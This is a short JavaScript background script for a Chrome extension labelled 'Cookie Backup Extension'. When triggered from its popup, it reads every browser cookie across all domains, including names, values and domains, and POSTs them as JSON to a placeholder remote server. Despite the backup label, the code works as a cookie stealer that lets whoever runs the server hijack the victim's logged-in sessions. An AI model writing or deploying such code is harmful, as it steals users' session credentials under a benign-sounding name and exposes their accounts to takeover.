chrome.runtime.onInstalled.addListener(() => {
    console.log("Cookie Backup Extension installed.");
  });
  
  // Listen for the popup to request cookies
  chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "backupCookies") {
      chrome.cookies.getAll({}, (cookies) => {
        let cookieData = cookies.map(cookie => {
          return { name: cookie.name, value: cookie.value, domain: cookie.domain };
        });
  
        // Send cookies to backend server
        fetch("https://your-server-url.com/send-cookies", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ cookies: cookieData })
        })
        .then(response => response.json())
        .then(data => {
          console.log("Cookies sent to server.");
          sendResponse({ message: "Cookies backed up and sent." });
        })
        .catch(error => {
          console.error("Error sending cookies:", error);
          sendResponse({ message: "Error sending cookies." });
        });
      });
      return true;  // Asynchronous response
    }
  });
  